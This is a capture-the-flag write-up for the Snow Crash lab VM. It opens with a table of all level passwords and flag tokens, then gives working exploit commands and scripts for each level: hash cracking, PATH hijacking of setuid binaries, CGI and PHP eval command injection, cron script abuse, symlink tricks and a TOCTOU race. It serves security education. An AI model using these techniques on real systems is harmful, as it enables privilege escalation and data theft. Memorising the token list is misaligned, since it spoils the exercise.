# All tokens

```b
level01  x24ti5gi3x0ol2eh4esiuxias
level02  f2av5il02puano7naaf6adaaf
level03  kooda2puivaav1idi4f57q8iq
level04  qi0maab88jeaj46qoumi7maus
level05  ne2searoevaevoem4ov4ar8ap
level06  viuaaale9huek52boumoomioc
level07  wiok45aaoguiboiki2tuin6ub
level08  fiumuikeil55xe9cu4dood66h
level09  25749xKZ8L7DkSCwJkT9dyv6f 
level10  s5cAJpM8ev6XHw998pRWG728z

flag00  nottoohardhere 
flag01  abcdefg
flag02  ft_waNDReL0L
flag08  quif5eloekouj29ke0vouxean ðŸ˜‘
flag09  f3iji1ju5yuevaus41q1afiuq
```
Level [00](https://github.com/nuoxoxo/snowcrash/tree/main?tab=readme-ov-file#00) - [01](https://github.com/nuoxoxo/snowcrash/tree/main?tab=readme-ov-file#01) - [02](https://github.com/nuoxoxo/snowcrash/tree/main?tab=readme-ov-file#02) - [03](https://github.com/nuoxoxo/snowcrash/tree/main?tab=readme-ov-file#03) - [04](https://github.com/nuoxoxo/snowcrash/tree/main?tab=readme-ov-file#04) - [05](https://github.com/nuoxoxo/snowcrash/tree/main?tab=readme-ov-file#05) - [06](https://github.com/nuoxoxo/snowcrash/tree/main?tab=readme-ov-file#06) - [07](https://github.com/nuoxoxo/snowcrash/tree/main?tab=readme-ov-file#07) - [08](https://github.com/nuoxoxo/snowcrash/tree/main?tab=readme-ov-file#08) - [09](https://github.com/nuoxoxo/snowcrash/tree/main?tab=readme-ov-file#09) - [10](https://github.com/nuoxoxo/snowcrash/tree/main?tab=readme-ov-file#10)



Subject [PDF](https://cdn.intra.42.fr/pdf/pdf/67635/en.subject.pdf) 

# SSH

```b
$ ifconfig
$ ifconfig | grep inet
$ ifconfig | grep 'inet ' | awk 'NR==2'
$ ssh level00@$(ifconfig | grep 'inet ' | awk 'NR==2 {print $2}') -p 4242
```

# 00

Login

```b
> ssh level00@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
> Password: level00
```

First thought

- `ls` `pwd`
  - the folder is empty, we are at `/home/user/level00`
- `id` `whoami` `id flag00`
  - we are level00 
  - another user flag00 has different permissions

Let's compare privileges btw level00 and flag00:

```b
> grep level00 /etc/passwd
level00:x:2000:2000::/home/user/level00:/bin/bash
> grep flag00 /etc/passwd
flag00:x:3000:3000::/home/flag/flag00:/bin/bash
                    ^^^^^^^^^^^^^^^^^ user home directories
> ls -l /home/user/level00
total 0
> ls -l /home/flag/flag00
ls: cannot open directory /home/flag/flag00: Permission denied
```

Let's check if we have other files outside of Home

```b
> ls -l
> find / -user level00 
> find / -user level00 2>/dev/null
> find / -user flag00 2>/dev/null
> find / -user flag00 -exec cat {} \; 2>/dev/null
OR
> find / -user flag00 -exec cat {} + 2>/dev/null
cdiiddwpgswtgt
cdiiddwpgswtgt
```

- `2>/dev/null` : redir stderr output to `/dev/null`
- `\;` : mark the end of `-exec` and runs `cat` on one file a time
- `/` : from root directory
- `+` : forces `find` to run `cat` on many files at once 


Decipher _`cdiiddwpgswtgt`_ in python

```py
a = ord('a')
for i in range(26):
    print(''.join(chr(a+(ord(c)-a+i)%26) for c in 'cdiiddwpgswtgt'))
```



# 01

Login

```b
> ssh level01@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
> Password: x24ti5gi3x0ol2eh4esiuxias
```

Look at `/etc/passwd`
```b
> grep -i flag01 /etc/passwd
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
> grep flag01 /etc/passwd | awk -F: '{print $2}'
42hDRfypTqqnw
```

What is `/etc/passwd`
- it is a list of user accounts and their info

```b
username:PWD:UID:GID:comment:home_dir:shell
         ^^^ ancient storage for encrypted passwd
             now passwd hashes are stored in /etc/shadow
```

Download and use `john`

```b
> wget https://download.openwall.net/pub/projects/john/contrib/macosx/john-1.8.0.9-jumbo-macosx_sse4.zip
> tar -xvf john-1.8.0.9-jumbo-macosx_sse4.zip
> cd john-1.8.0.9-jumbo-macosx_sse4
> echo 42hDRfypTqqnw > __test
> ./john __test
> ./john --show __test

OR

> ./do_john.sh
```

Why use `john`
- `./john --show` provides this line in the output

```b
[DES 128/128 SSE2-16]
```

- Data Encryption Standard (DES)
- DES is not truly encryption in the sense of encryption algorithms
- it is an old one-way transformation used to store passwds
- it is insecure due to small key size 
- using john to bruteforce-crack it is the most effecive way



# 02

Login

```b
> ssh level02@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
> Password: f2av5il02puano7naaf6adaaf
```

New stuff
- `realpath` - get the full absolute filepath
- `scp` - secure copy - `scp username@ip:path _local_`
- `~.pcap` - a Packet Capture to store network packet data captured during network traffic monitoring

Save the `.pcap` to Host
```b
### VM
> ls -l
----r--r-- 1 flag02 level02 level02.pcap
^ which means a regular file

> scp -P 4242 level02@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}'):/home/user/level02/level02.pcap $(pwd)
```

âŒ Inspect `.pcap`  

```b
### Host
> hexdump -C level02.pcap 
> xxd level02.pcap 
> xxd level02.pcap | grep -i pass -A10 -B10
> xxd level02.pcap | cut -d ' ' -f2-9 | tr -d ' '
```

âœ… Use _Wireshark_ 
- _Analyze - Follow - TCP Stream_ 
- copy _`TCP Stream`_ to text

```b
    000000D6  00 0d 0a 50 61 73 73 77  6f 72 64 3a 20            ...Passw ord: 
000000B9  66                                                 f
000000BA  74                                                 t
000000BB  5f                                                 _
000000BC  77                                                 w
000000BD  61                                                 a
000000BE  6e                                                 n
000000BF  64                                                 d
000000C0  72                                                 r
000000C1  7f                                                 .
000000C2  7f                                                 .
000000C3  7f                                                 .
000000C4  4e                                                 N
000000C5  44                                                 D
000000C6  52                                                 R
000000C7  65                                                 e
000000C8  6c                                                 l
000000C9  7f                                                 .
000000CA  4c                                                 L
000000CB  30                                                 0
000000CC  4c                                                 L
000000CD  0d                                                 .
```

- `7f` - DE
- `0d` - CR

Parse the above block

```py
infile = [[n[-2], n[-1]] for n in [_.split() for _ in open(0).read().split('\n') if len(_.split()) == 3]]
res = ''
for i, line in enumerate(infile):
    print('line/', line, 'i/', i)
    x, c = line
    if x == '7f':
        res = res[:-1]
    elif c != '.':
        res += c
    else:
        assert(x == '0d')
print('res/', res)

# ft_waNDReL0L
```


# 03

Login

```b
> ssh level03@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
> Password: kooda2puivaav1idi4f57q8iq
```

Inspect
- âŒ `file` `readelf` `strings` 
- âœ… `ltrace` 

```
> ls -l
-rwsr-sr-x 1 flag03 level03 8627 level03
 ^^^       owner flag03 can rwx also setuid bit is set
    ^^^    group level03 can rx plus setgid bit (s) is set
       ^^^ others can rx

ðŸ‘‰ when ./level03 is run
  the entire process runs with owner flag03's priviledges
  ie. I, user level00, can exploit priviledges limited to flag03

ðŸ‘‰ conclusion: execute the ./level03 and doing so we gain
  temporary elevated permissions as flag03
```

- We may also try `id` & `namei`

```b
> id
uid=2003(level03) gid=2003(level03) groups=2003(level03),100(users)

> namei -l ./level03 
dr-x------ level03 level03 .
-rwsr-sr-x flag03  level03 level03

> namei -l /bin/getflag
-rwxr-xr-x root root getflag
```

- `ltrace` traces library function calls when the binary is executed

```b
> ltrace ./level03
  ðŸ‘‰ we can see the `s` bit in action

### output
getegid()                                           = 2003
geteuid()                                           = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
system("/usr/bin/env echo Exploit me" ...

### observations
ðŸ‘‰ getegid & geteuid return a effective group/user ID 2003 
  which is my `id` as `level03`.
ðŸ‘‰ Because privileges are elevated during the process
  we have temporary permissions as `flag03`.
ðŸ‘‰ This way we can exploit the `/usr/bin/env echo`
  relative path vulnerability.
```

- Solution

```b
> whereis getflag
getflag: /bin/getflag
> echo -e "#\!/bin/bash\n/bin/getflag" > /tmp/echo
> chmod +x /tmp/echo
> export PATH=/tmp:$PATH  ðŸ‘ˆ prepend tmp to get it checked first
> ./level03
```


# 04 

Login

```b
> ssh level04@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
> Password: qi0maab88jeaj46qoumi7maus
```

We have a PERL script, \
and it seems to interact with a webpage:

```pl
#!/usr/bin/perl
# localhost:4747

use CGI qw{param};
  # CGI (Common Gateway Interface)
  # param: a CGI module func fetches params from HTTP requests
  # qw: quote words

print "Content-type: text/html\n\n";

sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
  # sub -- define subroutine x
  # $_[0] -- subroutine `x()` takes a single arg`
  # print w/ backticks invokes a shell command
  # 2>&1 -- combine stdout and stderr, & means 1 is a fd not a filename
}

x(param("x"));
  # 1st `x` : calling the subroutine
  # 2nd `x` : a query param
  # x comes in form of "...?x=getflag"
```

Solution
- try to scan and connect to `localhost:4242`
- set the query payload and Perl will echo it 

```b
> nc -vz localhost 4747
      ^ v: verbose
        z: scan if a port is open (a listening daemon)
Connection to localhost 4747 port [tcp/*] succeeded!


# eg.
> curl localhost:4747/?x="\`/usr/bin/whoami\`" 
> curl localhost:4747/?x="\`/usr/bin/id\`" 
> curl localhost:4747/?x="\`/bin/hostname\`" 
> curl localhost:4747/?x="\`/bin/pwd\`" 
> curl localhost:4747/?x="\`/bin/df\`" 


# avoid typing realpath out
> curl localhost:4747/?x="\`$(whereis pwd|awk '{print $2}')\`"
or
> curl localhost:4747/?x="\`$(which pwd)\`" ðŸŸ¢ 


# solve
> curl localhost:4747/?x="\`$(which getflag)\`"
```


# 05

Login

```b
> ssh level05@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
> Password: ne2searoevaevoem4ov4ar8ap
```

First observation
- an empty dir and nothing happens
- a _hint_ says "mail" and "cronjob"

Inspect `/var/mail`

```b
> crontab -l
no crontab for level05

> ls /var/mail
level05

> ls -l /var/mail/
-rw-r--r--+ 1 root mail 58 Nov 17 20:25 level05
^ ie. file

> cat /var/mail/level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

ðŸ‘† There's a cronjob
- it runs every 2nd minute
- it runs a script as flag05

Inspect `/usr/sbin/openarenaserver`

```b
> ls -l /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 /usr/sbin/openarenaserver
              ^^^^^^ ^^^^^^ resource excl. to user flag05

> cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

What this script does:
- it runs each file of `/opt/openarenaserver/*` 
- for each file, limit its exec runtime to 5 seconds
- for each file, we print out what it is, if it is a _script_
- rmv each file after use

Exploit
- put a script inside `/opt/openarenaserver/` 

```r
$ echo '/bin/getflag > /tmp/temp' \
> /opt/openarenaserver/solve.sh && \
chmod +x /opt/openarenaserver/solve.sh

# remember
# `/usr/sbin/openarenaserver` runs `bash -x` in a subshell
# it'll stdout nothing whether we `tee` `tee /dev/tty` or `sync` 
```

- ~~use `tee` : _read stdin and write to stdout and files_~~
- let it be run in 2min 


# 06 

Login

```b
> ssh level06@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
> Password: viuaaale9huek52boumoomioc
> ls -l
-rwsr-x---+ 1 flag06 level06 7503 level06
-rwxr-x---  1 flag06 level06  356 level06.php
```

There are 2 files.

Inspect:

```b
> file level06

level06: setuid ELF 32-bit LSB executable, 
Intel 80386, 
version 1 (SYSV),
dynamically linked (uses shared libs), 
for GNU/Linux 2.6.24, 
BuildID[sha1]=0xaabebdcd979e47982e99fa318d1225e5249abea7, 
not stripped 
```

```b
> cat level06.php 

#!/usr/bin/php
<?php
function y($m) {
  $m = preg_replace("/\./", " x ", $m);
  $m = preg_replace("/@/", " y", $m);
  return $m;
}
function x($y, $z) {
  $a = file_get_contents($y);
  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
  $a = preg_replace("/\[/", "(", $a);
  $a = preg_replace("/\]/", ")", $a);
  return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```

Inspect `y` function

```b
function y($m) {
  $m = preg_replace("/\./", " x ", $m);
  $m = preg_replace("/@/", " y", $m);
  return $m;
}
```

Function `y` filters m twice
1. `" x "` replaces all regex `/./`
2. `" y"` replaces all regex `/@/`

Inspect `x` function

```b
function x($y, $z) {
  $a = file_get_contents($y);
  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
  $a = preg_replace("/\[/", "(", $a);
  $a = preg_replace("/\]/", ")", $a);
  return $a;
}
```

Function `x` filters `argv[1]`
1. `"/(\[x (.*)\])/e"`
    - matches `[x `_cap_`]` and insert 2nd captured group to string `y("`_cap_`")` 
    - `/e` will eval the `y(\"\\2\")` as PHP code 
    - :yellow_circle: `/e` modifier only evaluates the replacement string we provide 
    - :yellow_circle: `/e` is deprecated long ago
2. `(` and `)` replace all `[` and `]` in the result respectively
- the func disregards argv[2]

Our goal
- `file_get_contents($argv[1])` depends on ___content___ of the file 
- so `argv[1]` to  a FILE 
- it should be oneline in form of `[x `_cap_`]`

Solution

```b
# get the _token/flag_ in there to be captured and printed out
  # shell_exec() system() exec() or simply backticks
# `getflag` called
# ${`getflag`} - get the ret
# [x ${`getflag`}] - framed in this form
# echo $(oneliner) > /tmp/temp - push it to a FILE

> echo '[x ${`getflag`}]' > /tmp/temp
> ./level06 /tmp/temp
```


# 07 

Login

```b
> ssh level07@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
> Password: wiok45aaoguiboiki2tuin6ub
> ls -l
-rwsr-sr-x 1 flag07 level07 8805 level07
```

First thought:
  - options: (not running it, just to see what it _prints_)

```b
> file level07
> strings level07
> xxd level07 | grep level
> xxd level07 | grep -A3 -B3 level
> readelf -s ./level07 | grep -E 'getenv|system|exec|echo|puts|write|printf'
> objdump -d level07 | grep -E "getenv|system|exec|echo|puts|write|printf"
                      regex ^^
```

Using `readelf -p .rodata` and `ltrace`
- `-p` : `string-dump` displays contents of a section as printable str
- `.rodata` : `read-only data` section = what we want to see

```b
> readelf -p .rodata ./level07 
String dump of section '.rodata':
  [     8]  LOGNAME
            ^^^^^^^ ðŸŸ¡ 
  [    10]  /bin/echo %s 
```
```b
> ltrace ./level07

__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                  = 2007
geteuid()                                                  = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)        = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)        = 0
getenv("LOGNAME")                                          = "level07"
        ^^^^^^^ ðŸŸ¡ 
asprintf(0xbffff744, 0x8048688, 0xbfffff4b, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                     = 0
+++ exited (status 0) +++
```

Run it and we found that it prints `LOGNAME`

```b
> ./level07 whoami
level07
> man env
> env logname
level06
> export LOGNAME='`id`'
> ./level07 
uid=3007(flag07) gid=2007(level07) groups=3007(flag07),100(users),2007(level07)
```

Solution
```b
> export LOGNAME='`getflag`'
> ./level07
```


# 08

Login

```b
> ssh level08@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
> Password: fiumuikeil55xe9cu4dood66h
> ls -l
-rwsr-s---+ 1 flag08 level08 8617 level08
-rw-------  1 flag08 flag08    26 token
              ^^^^^^ ^^^^^^ both flag08, not level08 ðŸŸ¡
```

2 files:

```b
> cat token
cat: token: Permission denied

> ./level08
./level08 [file to read]
```

Tryout

```b
> echo "a" > /tmp/tmp && ./level08 /tmp/tmp
a

> ltrace ./level08 /tmp/tmp
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("/tmp/tmp", "token")                                = NULL
open("/tmp/tmp", 0, 014435162522)                          = 3
read(3, "a\n", 1024)                                       = 2
write(1, "a\n", 2a
)                                         = 2
+++ exited (status 2) +++
```

```b
> echo "aB" > /tmp/tmp && ./level08 /tmp/tmp
aB

> ltrace ./level08 /tmp/tmp
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("/tmp/tmp", "token")                                = NULL
open("/tmp/tmp", 0, 014435162522)                          = 3
read(3, "a\n", 1024)                                       = 2
write(1, "a\n", 2a
)                                         = 2
+++ exited (status 2) +++
```

Observation:

- only the filename matters
- `./level` will cat the file, as long as filename contains no substr "token"
- renaming `./token` is not allowed
- but we can make a symlink of it
  - syntax: `ln -s real_path_src real_path_symlink`

Solution

```b
> ln -s `realpath token` /tmp/totem
> ./level08 /tmp/totem
```


# 09

Login

```b
> ssh level09@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
> Password: 25749xKZ8L7DkSCwJkT9dyv6f
> ls -l
-rwsr-sr-x 1 flag09 level09 7640 level09
----r--r-- 1 flag09 level09   26 token
```

```b
> xxd token
0000000: 6634 6b6d 6d36 707c 3d82 7f70 826e 8382  f4kmm6p|=..p.n..
0000010: 4442 8344 757b 7f8c 890a                 DB.Du{....
```

Run it
```b
> ./level09 token
tpmhr
> ./level09 123
135
> ./level09 246
258
> ./level09 abcd
aceg
> ./level09 xyz
xz|
> ./level09 az
a{
level09@SnowCrash:~$ ./level09 za
zb
level09@SnowCrash:~$ ./level09 zab
zbd ðŸ‘ˆ char = curr - i + 1

```

Simple algo

- p2: respect the syntax, write script in `vm/tmp/`
```b
line = open('/home/user/level09/token').read().strip()
print 'res/', ''.join(chr(ord(_) - i) for i, _ in enumerate(line))
```
- p3: `scp` to host and decode there 
```b
line = open(0, 'rb').read().strip()
print('res/', ''.join(chr(_ - i) for i, _ in enumerate(line)))

> scp -P 4242 level09@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}'):/home/user/level09/token $(pwd)
    25749xKZ8L7DkSCwJkT9dyv6f
> chmod 777 token && p3 decode.py < token
```


# 10

Login

```b
Login

> ssh level19@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
> Password: s5cAJpM8ev6XHw998pRWG728z
```

2 files, regular stuff

```b
> ls -l
-rwsr-sr-x+ 1 flag10 level10 10817 level10
-rw-------  1 flag10 flag10     26 token

> cat token
cat: token: Permission denied

> ./level10
./level10 file host
	sends file to host if you have access to it

> ./level10 token localhost
You don't have access to ./token
```

ltrace

```b
> ltrace ./level10 token localhost
__libc_start_main(0x80486d4, 3, 0xbffff7d4, 0x8048970, 0x80489e0 <unfinished ...>
access("token", 4)                                         = -1
^^^^^^ ðŸŸ¡ 
printf("You don't have access to %s\n", "token"You don't have access to token
)           = 31
+++ exited (status 31) +++
```

`access` - check if user has permissions for a file
- we don't have permission for `token`
- touch a file of our own, try again

```b
> ./level10 /tmp/tmp localhost
Connecting to localhost:6969 .. Unable to connect to host localhost

> ltrace ./level10 /tmp/tmp localhost
__libc_start_main(0x80486d4, 3, 0xbffff7d4, 0x8048970, 0x80489e0 <unfinished ...>
access("/tmp/tmp", 4)                                      = 0
printf("Connecting to %s:6969 .. ", "localhost")           = 32
                         ^^^^ ðŸŸ¡ 
fflush(0xb7fd1a20Connecting to localhost:6969 .. )         = 0
                                         ^^^^ ðŸŸ¡ 
```

Idea
- it eems the program interacts with `localhiost:6969`
- we need a valid Host IP : 
  - `127.0.0.1` or an old trick
  - `ifconfig | grep 'inet ' | awk 'NR==2 {print $2}' | cut -d ":" -f2`

With correct IP:

```b
> ./level10 /tmp/tmp $(ifconfig | grep 'inet ' | awk 'NR==2 {print $2}' | cut -d ":" -f2)
Connecting to Localhost:6969 .. Connected!
Sending file .. wrote file!
```

Inspect w/ `ltrace`:

```b
> ltrace ./level10 /tmp/tmp $(ifconfig | grep 'inet ' | awk 'NR==2 {print $2}' | cut -d ":" -f2)
.
.
.
printf("Connected!\nSending file .. "Connected!
)                     = 27
fflush(0xb7fd1a20Sending file .. )                                         = 0
open("/tmp/tmp", 0, 010)                                   = 4
      ^^^^^^^^ ðŸŸ¡ here is where we hope to force our token in

read(4, "", 4096)                                          = 0
write(3, "", 0)                                            = 0
puts("wrote file!"wrote file!
)                                        = 12
+++ exited (status 12) +++
```

Maybe it sends content of our file to `localhost:6969`
- try and intercept the content
- for that we use a 2nd terminal

```b
# t1
> nc -lk 6969
```
```b
# t2
> ./level10 /tmp/tmp Localhost
> Connecting to Localhost:6969 .. Connected!
Sending file .. wrote file!
```

Figure out a way to make `./level10` to read the true `token`:
- exploit `access()`'s [TOCTOU](https://stackoverflow.com/questions/75587120/how-to-handle-toctou-problem-between-access-and-unlink) vulnerability 
- design a file to do the following:
  - when `access()` is called it checks the low-priority file
  - after that, `./level10` should `open()` and `read()` the high-priotity one

Solution: \
to trick `access` we need a file that _alternates_ its type
- a file of our own permission level
- a symlink of the same name linked to `token`
- we need an alternation script

ðŸ‘‡

`alternate.sh`

```b
#!/bin/bash

t=/tmp/tmp

#timeout 2s bash -c '
while true; do
  touch $t
  rm -rf $t
  ln -s /home/user/level10/token $t
  rm -rf $t
done
#'
```

- a 2nd script to run `alternate` and `./level10` side by side
- a oneliner to unite two previous ones and `netcat`

`runner.sh`

```b
#!/bin/bash

#timeout 2s bash -c '
while true; do
  /home/user/level10/level10 /tmp/tmp 127.0.0.1 >/dev/null
done
#'
```

`oneliner`

```b
> /tmp/alternate.sh 2>/dev/null & /tmp/runner.sh 2>/dev/null & nc -lk 6969
```

